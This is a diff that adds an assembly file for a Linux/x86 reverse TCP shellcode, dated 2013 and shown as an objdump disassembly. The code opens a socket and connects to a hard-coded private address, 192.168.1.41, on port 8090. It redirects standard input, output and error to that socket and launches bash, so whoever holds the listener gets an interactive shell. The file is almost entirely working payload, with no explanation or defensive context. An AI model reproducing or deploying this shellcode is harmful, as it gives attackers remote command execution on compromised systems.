@@ -1,0 +1,61 @@
+; Filename : reverse_tcp_shell.asm
+; Author : M.Acosta <amcx62[_at_]gmail[_dot_]com>
+; Date : 2013 August
+; Location : Lima(Peru)
+; Desc : Reverse Tcp Shellcode
+; Tested on : Linux/x86 (Ubuntu SMP 3.2.0-49-generic-pae)
+
+ objdump -d -M intel ./reverse_tcp_shell
+
+./reverse_tcp_shell:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:  31 c0                	xor    eax,eax
+ 8048062:	b0 66                	mov    al,0x66
+ 8048064:	31 db                	xor    ebx,ebx
+ 8048066:	b3 01                	mov    bl,0x1
+ 8048068:	6a 06                	push   0x6
+ 804806a:	6a 01                	push   0x1
+ 804806c:	6a 02                	push   0x2
+ 804806e:	31 c9                	xor    ecx,ecx
+ 8048070:	89 e1                	mov    ecx,esp
+ 8048072:	cd 80                	int    0x80
+ 8048074:	89 c6                	mov    esi,eax
+ 8048076:	31 c0                	xor    eax,eax
+ 8048078:	b0 66                	mov    al,0x66
+ 804807a:	31 db                	xor    ebx,ebx
+ 804807c:	b3 03                	mov    bl,0x3
+ 804807e:	68 c0 a8 01 29       	push   0x2901a8c0
+ 8048083:	66 68 1f 9a          	pushw  0x9a1f
+ 8048087:	66 6a 02             	pushw  0x2
+ 804808a:	89 e1                	mov    ecx,esp
+ 804808c:	6a 10                	push   0x10
+ 804808e:	51                   	push   ecx
+ 804808f:	56                   	push   esi
+ 8048090:	89 e1                	mov    ecx,esp
+ 8048092:	cd 80                	int    0x80
+ 8048094:	87 de                	xchg   esi,ebx
+ 8048096:	31 c9                	xor    ecx,ecx
+ 8048098:	b1 02                	mov    cl,0x2
+
+0804809a <dup2_loop>:
+ 804809a:	b0 3f                	mov    al,0x3f
+ 804809c:	cd 80                	int    0x80
+ 804809e:	fe c9                	dec    cl
+ 80480a0:	79 f8                	jns    804809a <dup2_loop>
+ 80480a2:	31 c0                	xor    eax,eax
+ 80480a4:	50                   	push   eax
+ 80480a5:	68 62 61 73 68       	push   0x68736162
+ 80480aa:	68 62 69 6e 2f       	push   0x2f6e6962
+ 80480af:	68 2f 2f 2f 2f       	push   0x2f2f2f2f
+ 80480b4:	89 e3                	mov    ebx,esp
+ 80480b6:	50                   	push   eax
+ 80480b7:	89 e2                	mov    edx,esp
+ 80480b9:	53                   	push   ebx
+ 80480ba:	89 e1                	mov    ecx,esp
+ 80480bc:	b0 0b                	mov    al,0xb
+ 80480be:	cd 80                	int    0x80
+ 
